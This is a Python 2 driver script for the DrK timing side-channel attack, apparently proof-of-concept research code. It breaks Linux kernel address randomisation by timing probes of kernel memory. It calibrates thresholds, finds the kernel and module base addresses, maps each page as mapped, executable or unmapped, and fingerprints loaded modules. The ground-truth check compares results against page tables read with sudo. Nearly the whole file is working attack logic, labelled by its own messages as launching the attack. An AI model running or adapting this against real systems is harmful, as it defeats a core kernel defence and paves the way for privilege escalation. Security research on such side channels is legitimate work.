#!/usr/bin/env python2

import commands
import copy
import multiprocessing as mp
import optparse
import os
import platform
import pprint
from shutil import copyfile
import subprocess
import sys
import time

from colors import *

# get nproc for spawning loops to avoid speedstep noise
NPROC = mp.cpu_count()


# get measured timing to set threshold value
def measure(addr, mode, niter):
    out = commands.getoutput("./measure -a %s -m %s -i %s" \
                             % (hex(addr), mode, niter))
    return eval(out)

# get threshold value
def get_threshold(_type, _iter, _mode, _times):
    min_output = 0
    for i in xrange(_times):
        out = commands.getoutput("taskset -c 3 ./measure -t %s -m %s -i %s" % (_type, _mode, _iter))
        output = eval(out)
        if min_output == 0:
            min_output = output
        elif min_output['time'] > output['time']:
            min_output = output
    return min_output


# run measure with at least 1000 iterations, and set the threshold as
# the value in the middle of M/U or X/NX
def measure_threshold(opts):
    niter = int(opts.iter)
    if niter < 1000:
        niter = 1000

    # M / U
    nx_w = get_threshold("nx", niter, "writemem", 1)
    u_w = get_threshold("u", niter, "writemem", 1)

    # X / U (NX)
    x_j = get_threshold("x", niter, "jmp", 1)
    u_j = get_threshold("u", niter, "jmp", 1)
    a = ((nx_w['time'] + u_w['time'])/2.0) * 1.00
    b = ((x_j['time'] + u_j['time'])/2.0) * 1.00
    return (a,b,(nx_w, u_w, x_j, u_j))


# Read ground truth (for comparision; this is not used for attack).
def get_kernel_text_area_linux(gt_fn, is_module, do_m_only):
    f = open(gt_fn,'r')
    lines = f.readlines()
    f.close()

    idx = 0
    kernel_start_idx = 0
    kernel_end_idx = 0
    if is_module:
        while True:
            if(lines[idx] == '---[ Modules ]---\n'):
                kernel_start_idx = idx+1
            if(lines[idx] == '---[ End Modules ]---\n'):
                kernel_end_idx = idx
                break
            idx += 1

    else:
        while True:
            if(lines[idx] == '---[ High Kernel Mapping ]---\n'):
                kernel_start_idx = idx+1
            if(lines[idx] == '---[ Modules ]---\n'):
                kernel_end_idx = idx
                break
            idx += 1
    kernel_lines = lines[kernel_start_idx:kernel_end_idx]
    kernel_areas = []
    for line in kernel_lines:
        line_arr = line.split(' ')
        addrs = line_arr[0].split('-')
        if line_arr[-3] == 'x':
            perm = 'X'
        elif line_arr[-2] == '':
            perm = 'U'
        else:
            perm = 'NX'
        #perm = line_arr[-2]
        #if perm == '':
        #    perm = line_arr[-3]
        #    if perm == '':
        #        perm = 'U'
        #    else:
        #        perm = 'X'

        if(do_m_only and perm == 'X'):
            perm = 'NX'
        v = {}
        v['addr_start'] = int(addrs[0], 16)
        v['addr_end'] = int(addrs[1], 16)
        v['perm'] = perm
        kernel_areas.append(v)

    kernel_map = {}
    for kernel_mem in kernel_areas:
        start = kernel_mem['addr_start']
        end = kernel_mem['addr_end']
        #print(start)
        #print(end)
        while True:
            if start >= end:
                break
            kernel_map[start] = kernel_mem
            start += 0x1000
    kernel_map['kernels'] = kernel_areas
    return kernel_map

# build ground truth from page table.
# This is for testing accuracy, and not used for the attack.
def build_ground_truth():
    os.system("sudo cp /sys/kernel/debug/kernel_page_tables kpt 2>/dev/null; sudo chmod 644 ./kpt 2>/dev/null")
    if os.path.exists('kpt'):
        ret = {}
        try:
            ret['kernel_m'] = get_kernel_text_area_linux('kpt', False, True)
            ret['kernel_x'] = get_kernel_text_area_linux('kpt', False, False)
            ret['module_m'] = get_kernel_text_area_linux('kpt', True, True)
            ret['module_x'] = get_kernel_text_area_linux('kpt', True, False)
        except IOError:
            return None
        return ret
    return None


# General information for Linux kernel.
KERNEL_BASE_START = 0xffffffff80000000
KERNEL_BASE_END = 0xffffffffc0000000
KERNEL_ALIGN = 0x200000

MODULE_BASE_START = 0xffffffffc0000000
MODULE_BASE_END = 0xffffffffc0400000
MODULE_ALIGN = 0x1000

# write scan file for drk-probing
def write_scan_file(fn, rows):
    fd = open(fn, 'w')
    for row in rows:
        fd.write("%x\n" % row['start'])
        fd.write("%x\n" % row['end'])
        fd.write("%x\n" % row['align'])
    fd.close()

# find kernel base address, and write a scan file for
# deep scan (probing each page)
def find_base_addr(_type, m_th, opts):
    row = {}
    filename = '%s_scan' % _type
    if _type == 'kernel':
        row['start'] = KERNEL_BASE_START
        row['end'] = KERNEL_BASE_END
        row['align'] = KERNEL_ALIGN
    elif _type == 'module':
        row['start'] = MODULE_BASE_START
        row['end'] = MODULE_BASE_END
        row['align'] = MODULE_ALIGN

    write_scan_file(filename, [row])
    time_before = time.time()
    os.system("taskset -c 3 ./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null"\
                % (filename, opts.iter, filename))
    fd = open(filename + "_" + opts.iter + "_0", "r")
    lines = fd.readlines()
    fd.close()
    lines.pop(0)
    start_addr = None
    end_addr = None
    found = False
    for line in lines:
        arr = line.split(' ')
        if (not found) and int(arr[1]) < m_th:
            found = True
            start_addr = int(arr[0], 16)
        if found and int(arr[1]) > m_th:
            end_addr = int(arr[0], 16)
            break

    return start_addr, end_addr

# probe kernel mapping space with drk-probing
def handle_kernel(k_addrs, opts):
    k_base = k_addrs[0]
    k_end = k_addrs[1]
    k_2mb_end = k_base + 0x600000
    row_1 = {}
    row_1['start'] = k_base
    row_1['end'] = k_2mb_end
    row_1['align'] = 0x200000
    row_2 = {}
    row_2['start'] = k_2mb_end
    row_2['end'] = k_end
    row_2['align'] = 0x1000

    rows = [row_1, row_2]

    write_scan_file("scan_kernel", rows)
    os.system("./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null" \
                % ("scan_kernel", opts.iter, "scan_kernel"))
    fn = ("scan_kernel_%s_0" % opts.iter)
    fd = open(fn, 'r')
    lines = fd.readlines()
    fd.close()
    lines.pop(0)
    return [line.strip().split(' ') for line in lines]

# probe kernel mapping space with drk-probing
def handle_module(m_addrs, opts):
    m_base = m_addrs[0]
    m_end = m_base + 0xc00000
    row = {}
    row['start'] = m_base
    row['end'] = m_end
    row['align'] = 0x1000
    rows = [row]
    write_scan_file("scan_module", rows)
    os.system("taskset -c 3 ./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null"\
                % ("scan_module", opts.iter, "scan_module"))
    fn = ("scan_module_%s_0" % opts.iter)
    fd = open(fn, 'r')
    lines = fd.readlines()
    fd.close()
    lines.pop(0)
    return [line.strip().split(' ') for line in lines]

def match_data(data, m_th, x_th):
    for datum in data:
        m_value = int(datum[1])
        x_value = int(datum[2])
        if(m_value > m_th):
            datum.append('U') # unmapped (for M/U)
            datum.append('U') # unmapped (for X/NX/U)
        else:
            datum.append('M') # mapped
            if(x_value > x_th):
                datum.append('N') # non executable
            else:
                datum.append('X') # executable

# get string map data (e.g. files such as kernel_map module_map)
def get_map(data, do_m_only, module_data = None):
    data_list = []
    current_start_address = None
    current_perm = None
    for datum in data:
        addr = int(datum[0], 16)
        perm = 'U'
        if do_m_only:
            if datum[3] == 'U':
                perm = 'U'
            else:
                perm = 'NX'
        else:
            if datum[3] == 'U':
                perm = 'U'
            elif datum[4] == 'X':
                perm = 'X'
            else:
                perm = 'NX'

        if current_start_address == None:
            current_start_address = addr
            current_perm = perm
        if current_perm != perm:
            string = "0x%16x-0x%16x %s" \
                        % (current_start_address, addr, current_perm)
            data_list.append(string)
            current_start_address = addr
            current_perm = perm
    count = 0
    unique_list = []
    if module_data != None:
        print(BLUE + "[*] Tries to find modules..." + NORMAL)
        for i in xrange(len(data_list)):
            data = data_list[i]
            splitted = data.split(' ')
            if splitted[1] == 'X':
                next_data = data_list[i+1]
                splitted2 = next_data.split(' ')
                if(splitted2[1] == 'NX'):
                    a,b = splitted[0].split('-')
                    a = int(a, 16)
                    b = int(b, 16)
                    x_size = b-a
                    a,b = splitted2[0].split('-')
                    a = int(a, 16)
                    b = int(b, 16)
                    m_size = b-a
                    key = "%x %x" % (x_size, m_size)
                    try:
                        names = module_data[key]
                        if len(names) == 1:
                            count += 1
                            unique_list.append(names[0])
                        data_list[i] = "%s %s" % (data,",".join(names))
                    except KeyError:
                        pass

        print(("[+] Found " + RED + "%d" + NORMAL + " unique modules") % count)
        i = 0
        while True:
            if i >= len(unique_list):
                break
            print(repr(unique_list[i:i+6]))
            i += 6
        #print(repr(unique_list))
    return data_list

# Compare the result of DrK to the ground truth information,
# in order to get the accuracy of page map
def get_accuracy(data, ground_truth, do_m_only):
    num_total = 0
    num_true = 0
    num_false = 0
    data_list = []
    wrong_list = []
    for datum in data:
        num_total += 1
        addr = int(datum[0], 16)
        gt = ground_truth[addr]
        gt_perm = gt['perm']
        my_perm = None
        if do_m_only:
            if datum[3] == 'U':
                my_perm = 'U'
            else:
                my_perm = 'NX'
        else:
            if datum[3] == 'U':
                my_perm = 'U'
            elif datum[4] == 'X':
                my_perm = 'X'
            else:
                my_perm = 'NX'

        line = copy.copy(datum)
        if my_perm == gt_perm:
            num_true += 1
            line.append('O')
        else:
            num_false += 1
            line.append(my_perm)
            line.append(gt_perm)
            line.append('WRONG')
            wrong_list.append(line)
        data_list.append(line)

    return (num_total, num_true, num_false,
            (float(num_true)/float(num_total) * 100), data_list, wrong_list)

def write_data_list(data_list, fn):
    new_data_list = [' '.join(line) for line in data_list]
    fd = open(fn, 'w')
    fd.write('\n'.join(new_data_list))
    fd.close()

def print_list_to_file(data_list, fn):
    fd = open(fn, 'w')
    fd.write("Generated by DrK\n")
    for line in data_list:
        fd.write(line + "\n")
    fd.close()

def pretty_print_result(res, description):
    total_pages = res[0]
    correct_pages = res[1]
    wrong_pages = res[2]
    accuracy = res[3]
    string = ("%s Total " + BLUE + "%s" + NORMAL + " pages, correct " +
                BLUE + "%s" + NORMAL + " pages, wrong %s pages, accuracy: " +
                GREEN + "%3.2f" + NORMAL + "%%") \
                % (description, total_pages, correct_pages,
                        wrong_pages, accuracy)
    if(wrong_pages != 0):
        print(res[5])
    return string

# Launch DrK attack.
def pwn(opts, start_time):

    # measure threshold
    t_start = time.time();
    print("[*] Measuring M/X threshold (using user-level pages)")
    thresholds = measure_threshold(opts)
    m_th = thresholds[0]
    x_th = thresholds[1]

    if(opts.m_threshold != '0'):
        m_th = int(opts.m_threshold)

    if(opts.x_threshold != '0'):
        x_th = int(opts.x_threshold)

    print(("[+] M threshold " + MAGENTA + "%d" + NORMAL + \
            " (by accessing NULL and write on RO page)") % m_th)
    print(("[+] X threshold " + RED + "%d" + NORMAL + \
            " (by executing on NX page / jump on invalid instruction)") % x_th)


    # find kernel and module base address
    print(BLUE + "[*] Finding kernel address range" + NORMAL)
    time_before = time.time()
    k_base = find_base_addr('kernel', m_th, opts)
    time_end = time.time()
    print(("[+] Kernel base "+ MAGENTA + "%x" + NORMAL) % k_base[0])
    print(("[+] Kernel end "+ RED +"%x" + NORMAL) % k_base[1])
    print(("Took " + BLUE + "%d" + NORMAL + " ms") \
            % int((time_end - time_before) * 1000))

    print(BLUE + "[*] Finding module address range" + NORMAL)
    time_before = time.time()
    m_base = find_base_addr('module', m_th, opts)
    time_end = time.time()
    print(("[+] Module base " + MAGENTA + "%x" + NORMAL) % m_base[0])
    print(("[+] Module end "+ RED +"%x" + NORMAL) % (m_base[0] + 0xc00000))
    print(("Took " + BLUE + "%d" + NORMAL + " ms") \
            % int((time_end - time_before) * 1000))

    # get full map of kernel and module mappings (per each page)
    print("[*] Run DrK attacks for kernel and module address space..." + NORMAL)
    k_data = handle_kernel(k_base, opts)
    m_data = handle_module(m_base, opts)

    print("[*] Determining X/NX/U by the threshold value.." + NORMAL)
    match_data(k_data, m_th, x_th)
    match_data(m_data, m_th, x_th)
    t_end = time.time();
    print(("Took " + BLUE + "%d" + NORMAL + " ms on detecting all pages.") \
            % int((t_end - start_time)*1000))


    # reading ground truth information (to get accuracy)
    print("[*] Reading ground truth data from page tables" + NORMAL)
    gr_truth = build_ground_truth()
    accuracies = []
    if gr_truth != None:
        ka_m = get_accuracy(k_data, gr_truth['kernel_m'], True)
        accuracies.append(ka_m[3])
        print(pretty_print_result(ka_m, "Kernel M/U testing result\n"))
        write_data_list(ka_m[-1], 'kernel_m')
        ka_m = get_accuracy(k_data, gr_truth['kernel_x'], False)
        accuracies.append(ka_m[3])
        print(pretty_print_result(ka_m, "Kernel X/NX/U testing result\n"))
        write_data_list(ka_m[-1], 'kernel_x')
        ka_m = get_accuracy(m_data, gr_truth['module_m'], True)
        accuracies.append(ka_m[3])
        print(pretty_print_result(ka_m, "Module M/U testing result\n"))
        write_data_list(ka_m[-1], 'module_m')
        ka_m = get_accuracy(m_data, gr_truth['module_x'], False)
        accuracies.append(ka_m[3])
        print(pretty_print_result(ka_m, "Module X/NX/U testing result\n"))
        write_data_list(ka_m[-1], 'module_x')
        os.system("./get_module_signature.rb")
    else:
        print("[x] " + RED + \
              "Ground truth is not available CONFIG_X86_PTDUMP is not available"\
              + NORMAL)

    accuracies.append(["0x%16x" % addr for addr in k_base])
    accuracies.append(["0x%16x" % addr for addr in m_base])

    # generate kernel_map and module_map result (from DrK)
    k_map = get_map(k_data, False)
    print_list_to_file(k_map, 'kernel_map')
    fn = opts.data
    module_dict = None
    if os.path.isfile(fn):
        fd = open(fn)
        module_dict = eval(fd.read())
        fd.close()
    m_map = get_map(m_data, False, module_data = module_dict)
    print_list_to_file(m_map, 'module_map')

    print("[*] check output " + BLUE + "kernel_map" + NORMAL + \
            " and " + BLUE + "module_map" + NORMAL + " for the details")
    print("    e.g. " + MAGENTA + \
            "vim -d module_map modules_ground_truth.out" + NORMAL)
    accuracies.append((t_end - t_start))
    return accuracies

if __name__ == '__main__':

    if not os.path.exists('drk-probing'):
        print("Error: Please run 'make' to build necessary files.")
        quit()
    if not os.path.exists('loop') or not os.path.exists('measure'):
        print("Error: Please run 'make' on ../common and ../timing " +
                "to build necessary files.")
        quit()
    parser = optparse.OptionParser("[usage] XXX")
    parser.add_option("-i", "--iter", default='250', help="# iterations")
    parser.add_option("-M", "--m_threshold", default='0',
                        help="set Mapped threshold")
    parser.add_option("-X", "--x_threshold", default='0',
                        help="set eXecutable threshold")
    parser.add_option("-o", "--outfile", default="output",
                        help="Name of output file")
    parser.add_option("-l", "--loops", default=str(NPROC/2), help="Number of loops")
    parser.add_option("-d", "--data", default='modules_size.txt',
                        help="filename for module size data")

    (opts, args) = parser.parse_args()

    print(("Run DrK attack with %s iterations, and module data " + \
            "from %s.") % (opts.iter, opts.data))

    # delete prior results
    os.system("rm kernel_* module_* 2>/dev/null")

    # kill all loops if exists
    os.system("killall -9 loop 2>/dev/null")

    # run loops for avoiding the noise from speedstep
    # (creating nproc/2 loops to make the processor to work as full throttle)
    for i in xrange(int(opts.loops)):
        os.system("taskset -c %d ./loop&" % i)

    print("[*] Adjusting Clocks for Intel SpeedStep... (sleep 2 seconds)")
    time.sleep(2)

    # launch DrK attack
    print(BOLD + BLUE + "[*] start attack!" + NORMAL)
    start_time = time.time()
    accuracies = pwn(opts, start_time)
    end_time = time.time()
    elapsed_time = (end_time - start_time)
    print(("Page Scan time: " + BLUE + "%f" + NORMAL + " seconds") \
            % accuracies[-1])
    print(("Total Elapsed Time: " + BLUE + "%f" + NORMAL + " seconds") \
            % elapsed_time)

    # kill all loops
    os.system("killall -9 loop")
